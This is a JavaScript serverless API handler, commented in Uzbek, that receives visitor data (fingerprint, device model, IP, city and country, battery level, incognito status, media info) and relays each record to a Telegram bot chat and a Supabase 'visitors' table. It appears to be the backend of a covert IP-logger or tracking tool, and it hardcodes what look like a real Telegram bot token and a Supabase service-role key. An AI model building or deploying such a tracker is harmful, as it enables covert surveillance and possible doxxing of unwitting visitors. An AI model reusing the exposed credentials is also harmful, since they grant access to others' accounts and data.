export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;
    const BOT_TOKEN = '8719431824:AAGiJ9wTJ5XAn3xv0mr1weYhgOyAq-KFblA';
    const CHAT_ID = '5572037414';
    const SUPABASE_URL = 'https://hhsasepeklroqbvnaewg.supabase.co';
    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhoc2FzZXBla2xyb3Fidm5hZXdnIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzY2NzM5MiwiZXhwIjoyMDkzMjQzMzkyfQ.U4wV6U3dCbl29f8X3Jng6EMfoPoPpxYLkJhF1xvPhys';

    const ip = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || '0.0.0.0';
    const now = new Date();
    const uzTime = new Date(now.getTime() + (5 * 60 * 60 * 1000)).toLocaleString('uz-UZ', { timeZone: 'UTC' });

    // 1. Telegram xabarini tayyorlash
    const message = `
🚀 *HISOBOT: ${data.fingerprint || 'Noma\'lum'}*
----------------------------
🕒 Vaqt: ${uzTime}
📱 Qurilma: ${data.exactModel || data.platform || 'Noma\'lum'}
🌐 Ilova: ${data.userAgent?.substring(0, 40)}...
🌍 IP: ${ip}
📍 Joylashuv: ${data.city || ''}, ${data.country || ''}
🔋 Batareya: ${data.battery?.level || 'Noma\'lum'}
----------------------------
`;

    // 2. Telegram-ga yuborish (Eng muhim amal)
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) { console.error('TG Error:', e); }

    // 3. Supabase-ga saqlash (Keyingi navbatda)
    try {
        await fetch(`${SUPABASE_URL}/rest/v1/visitors`, {
            method: 'POST',
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=minimal'
            },
            body: JSON.stringify({
                fingerprint: data.fingerprint,
                device_model: data.exactModel || data.platform,
                ip_address: ip,
                location: `${data.city || ''}, ${data.country || ''}`,
                battery: `${data.battery?.level || ''}`,
                user_agent: data.userAgent,
                incognito: data.incognito,
                media: JSON.stringify(data.media || {})
            })
        });
    } catch (e) { console.error('DB Error:', e); }

    return res.status(200).json({ success: true });
}
